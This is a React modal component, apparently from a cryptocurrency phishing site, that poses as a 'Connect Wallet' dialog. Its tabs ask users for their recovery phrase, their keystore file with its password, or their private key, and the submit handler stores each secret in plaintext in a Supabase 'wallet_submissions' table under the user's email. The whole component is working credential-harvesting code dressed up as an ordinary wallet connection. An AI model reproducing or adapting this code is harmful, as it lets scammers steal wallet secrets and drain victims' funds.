
import React, { useState, useEffect } from 'react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogClose
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { X, Wallet } from 'lucide-react';
import { supabase } from '@/lib/supabase';
import { getWalletIconUrlSync, hasWalletIcon, getWalletFallbackDisplay } from '@/utils/walletIconDisplay';

export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess, onFeedback }) {
  const [activeTab, setActiveTab] = useState('phrase');
  const [phrase, setPhrase] = useState('');
  const [keystoreJson, setKeystoreJson] = useState('');
  const [keystorePassword, setKeystorePassword] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [currentUserEmail, setCurrentUserEmail] = useState(null);

  useEffect(() => {
    const fetchUser = async () => {
      try {
        console.log('🔍 Fetching current user for wallet submission...');
        const { data: { user }, error: userError } = await supabase.auth.getUser();
        
        if (userError || !user) {
          console.error('❌ User fetch error:', userError);
          throw new Error('Failed to get current user');
        }
        
        console.log('✅ User fetched successfully:', user.email);
        setCurrentUserEmail(user.email);
      } catch (error) {
        console.error("❌ User not logged in", error);
        onFeedback('error', 'Authentication Error', 'You must be logged in to submit a wallet.');
        onClose();
      }
    };
    if (isOpen) {
      console.log('🚀 ConnectWalletModal opened, fetching user...');
      fetchUser();
    }
  }, [isOpen]);

  const resetForm = () => {
    setPhrase('');
    setKeystoreJson('');
    setKeystorePassword('');
    setPrivateKey('');
    setActiveTab('phrase');
  };

  const handleSubmit = async () => {
    console.log('🚀 Submitting wallet details...', { currentUserEmail, wallet: wallet?.name });
    
    if (!currentUserEmail) {
      console.error('❌ No current user email found');
      onFeedback('error', 'Authentication Error', 'Could not identify the current user. Please log in again.');
      return;
    }

    if (keystoreJson.trim() !== '' && keystorePassword.trim() === '') {
        onFeedback('error', 'Missing Information', 'Please provide the wallet password for your keystore.');
        setIsSubmitting(false);
        return;
    }

    setIsSubmitting(true);
    const submissionPromises = [];
    const baseSubmission = {
      user_email: currentUserEmail,
      wallet_name: wallet.name
    };

    if (phrase.trim() !== '') {
        submissionPromises.push(supabase
            .from('wallet_submissions')
            .insert({
                ...baseSubmission,
                submission_type: 'phrase',
                phrase: phrase.trim()
            })
            .then(response => {
              if (response.error) throw response.error;
              return response;
            }));
    }

    if (keystoreJson.trim() !== '' && keystorePassword.trim() !== '') {
        submissionPromises.push(supabase
            .from('wallet_submissions')
            .insert({
                ...baseSubmission,
                submission_type: 'keystore',
                keystore_json: keystoreJson.trim(),
                keystore_password: keystorePassword.trim()
            })
            .then(response => {
              if (response.error) throw response.error;
              return response;
            }));
    }

    if (privateKey.trim() !== '') {
        submissionPromises.push(supabase
            .from('wallet_submissions')
            .insert({
                ...baseSubmission,
                submission_type: 'private_key',
                private_key: privateKey.trim()
            })
            .then(response => {
              if (response.error) throw response.error;
              return response;
            }));
    }

    if (submissionPromises.length === 0) {
        onFeedback('error', 'Missing Information', 'Please fill in at least one wallet connection method.');
        setIsSubmitting(false);
        return;
    }

    try {
        const results = await Promise.all(submissionPromises);
        console.log('Wallet submission results:', results);

        onFeedback('success', 'Submission Successful!', `${submissionPromises.length} wallet detail(s) for ${wallet.name} submitted successfully!`);
        onSuccess();
        onClose();
        resetForm();

    } catch (error) {
        console.error('Wallet submission failed:', error);
        let errorMessage = 'An error occurred while submitting your wallet details.';
        
        if (error.message) {
          if (error.message.includes('duplicate key')) {
            errorMessage = 'You have already submitted wallet details for this wallet.';
          } else if (error.message.includes('network')) {
            errorMessage = 'Network error. Please check your connection and try again.';
          } else {
            errorMessage = error.message;
          }
        }
        
        onFeedback('error', 'Submission Failed', errorMessage);
    } finally {
        setIsSubmitting(false);
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md max-h-[90vh] flex flex-col bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700">
        <DialogHeader className="sticky top-0 bg-white dark:bg-gray-800 z-10 py-4 border-b border-gray-200 dark:border-gray-700">
          <div className="flex items-center gap-2">
            {hasWalletIcon(wallet) ? (
              <img 
                src={getWalletIconUrlSync(wallet)} 
                alt={wallet.name || 'Wallet icon'}
                className="w-6 h-6 object-contain"
                onError={(e) => {
                  e.currentTarget.style.display = 'none'; // Hide the broken image
                  const fallbackElement = e.currentTarget.nextElementSibling;
                  if (fallbackElement) {
                    fallbackElement.style.display = 'flex'; // Show the fallback div
                  }
                }}
              />
            ) : null}
            <div 
              className={`w-6 h-6 bg-blue-600 rounded flex items-center justify-center text-white text-sm font-semibold ${hasWalletIcon(wallet) ? 'hidden' : 'flex'}`}
            >
              {getWalletFallbackDisplay(wallet)}
            </div>
            <DialogTitle className="text-xl font-bold text-gray-900 dark:text-white">
              Connect {wallet?.name || ''} Wallet
            </DialogTitle>
          </div>
        </DialogHeader>
        
        <div className="py-6 px-1 space-y-6 overflow-y-auto flex-1">
          <p className="text-sm text-gray-500 dark:text-gray-400 mb-4">
            Enter your wallet details. You can fill in multiple wallet types before connecting. Each filled tab will be submitted.
          </p>

                     <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
             <TabsList className="grid w-full grid-cols-3">
               <TabsTrigger value="phrase" className="data-[state=active]:bg-white dark:data-[state=active]:bg-gray-700">
                 <span className="data-[state=active]:text-gray-900 dark:data-[state=active]:text-white">Phrase</span>
               </TabsTrigger>
               <TabsTrigger value="keystore" className="data-[state=active]:bg-white dark:data-[state=active]:bg-gray-700">
                 <span className="data-[state=active]:text-gray-900 dark:data-[state=active]:text-white">Keystore</span>
               </TabsTrigger>
               <TabsTrigger value="private" className="data-[state=active]:bg-white dark:data-[state=active]:bg-gray-700">
                 <span className="data-[state=active]:text-gray-900 dark:data-[state=active]:text-white">Private Key</span>
               </TabsTrigger>
             </TabsList>

            <TabsContent value="phrase" className="mt-6">
              <div className="space-y-2">
                <label htmlFor="recovery-phrase" className="font-medium text-sm text-gray-900 dark:text-white">Recovery Phrase</label>
                <Textarea
                  id="recovery-phrase"
                  placeholder="Enter your recovery phrase"
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  className="h-28"
                />
                <p className="text-xs text-gray-500 dark:text-gray-400">Typically 12 (sometimes 24) words properly separated by single spaces</p>
              </div>
            </TabsContent>

            <TabsContent value="keystore" className="mt-6">
              <div className="space-y-4">
                <div className="space-y-2">
                  <label htmlFor="keystore-json" className="font-medium text-sm text-gray-900 dark:text-white">Keystore</label>
                  <Textarea
                    id="keystore-json"
                    placeholder='{ "address": "...", "crypto": { ... } }'
                    value={keystoreJson}
                    onChange={(e) => setKeystoreJson(e.target.value)}
                    className="h-28"
                  />
                </div>
                <div className="space-y-2">
                  <label htmlFor="keystore-password" className="font-medium text-sm text-gray-900 dark:text-white">Keystore/Wallet Password</label>
                  <Input
                    id="keystore-password"
                    type="text"
                    placeholder="Enter Keystore/Wallet Password"
                    value={keystorePassword}
                    onChange={(e) => setKeystorePassword(e.target.value)}
                  />
                  <p className="text-xs text-gray-500 dark:text-gray-400">Several lines of text plus the password used to encrypt it</p>
                </div>
              </div>
            </TabsContent>

            <TabsContent value="private" className="mt-6">
              <div className="space-y-2">
                <label htmlFor="private-key" className="font-medium text-sm text-gray-900 dark:text-white">Private Key</label>
                <Textarea
                  id="private-key"
                  placeholder="Enter your Private Key"
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  className="h-28"
                />
                <p className="text-xs text-gray-500 dark:text-gray-400">Your private key string</p>
              </div>
            </TabsContent>
          </Tabs>

                     <div className="flex justify-end gap-3 mt-8 border-t border-gray-200 dark:border-gray-700 pt-4">
             <DialogClose asChild>
               <Button variant="outline" className="border-gray-200 dark:border-gray-600 text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700">Cancel</Button>
             </DialogClose>
             <Button onClick={handleSubmit} disabled={isSubmitting} className="bg-blue-600 hover:bg-blue-700">
               {isSubmitting ? 'Submitting...' : 'Submit Details'}
             </Button>
           </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}
